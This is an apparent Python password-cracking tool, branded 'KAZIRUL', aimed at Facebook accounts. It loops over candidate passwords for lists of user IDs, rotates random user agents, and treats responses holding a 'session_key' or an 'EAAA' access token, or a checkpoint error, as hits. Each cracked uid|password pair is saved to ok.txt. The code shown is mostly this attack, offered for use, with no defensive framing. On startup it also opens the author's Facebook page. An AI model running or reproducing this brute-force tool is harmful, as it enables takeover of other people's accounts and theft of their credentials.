#THE TOOL CREATED BY KAZIRUL ISLAM
#India Cyber Security Force 
#FB : https://www.facebook.com/Kazirul.10?mibextid=ZbWKwL
...
logo = ("""
  ...
  _  __           ___________ _____  _    _ _      
 | |/ /    /\    |___  /_   _|  __ \| |  | | |     
 | ' /    /  \      / /  | | | |__) | |  | | |     
 |  <    / /\ \    / /   | | |  _  /| |  | | |     
 | . \  / ____ \  / /__ _| |_| | \ \| |__| | |____ 
 |_|\_\/_/    \_\/_____|_____|_|  \_\\____/|______|
                                                   
                                                   

╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : KAZIRUL 
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : Md. Saiful Islam 
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : KAZIRUL
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/Kazirul.10?mibextid=ZbWKwL')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is KAZIRUL")
			print("")
			input("\n\033[1;32m   ENTER MY FACEBOOK PAGE NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By KAZIRUL ")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
	...
	def fbtua(self):
		...
		try:
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using KAZIRULTools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[KAZIRUL] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [KAZIRUL] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[1;32m   [KAZIRUL] %s | %s\033[32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
